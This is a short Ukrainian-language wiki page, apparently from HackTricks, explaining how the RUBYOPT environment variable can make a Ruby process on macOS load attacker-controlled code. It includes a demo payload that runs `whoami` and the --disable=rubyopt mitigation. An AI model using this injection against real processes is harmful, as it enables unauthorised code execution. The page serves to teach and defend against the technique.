# Ін’єкція в Ruby Applications на macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby аналізує підтримувані перемикачі командного рядка зі змінної середовища `RUBYOPT` перед запуском скрипту. Хоча Ruby відхиляє деякі перемикачі в цій змінній, `-I` може додати директорію пошуку бібліотек, а `-r` — завантажити бібліотеку. Тому процес, який запускає Ruby з контрольованими attacker-ом змінними середовища, можна змусити завантажити контрольований attacker-ом Ruby-код.<sup>[[1]](#references)</sup>

Створіть `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Створіть нешкідливий Ruby-скрипт, наприклад `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Запустіть його з контрольованим значенням `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Щоб вимкнути цю поведінку, передайте `--disable=rubyopt` (або `--disable-rubyopt`) **перед** назвою скрипту:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Опція, записана після `hello.rb`, передається скрипту в `ARGV`; вона не вимикає попередню обробку Ruby змінної `RUBYOPT`.<sup>[[1]](#references)</sup>

## References

- [1] [Документація Ruby - параметри командного рядка Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
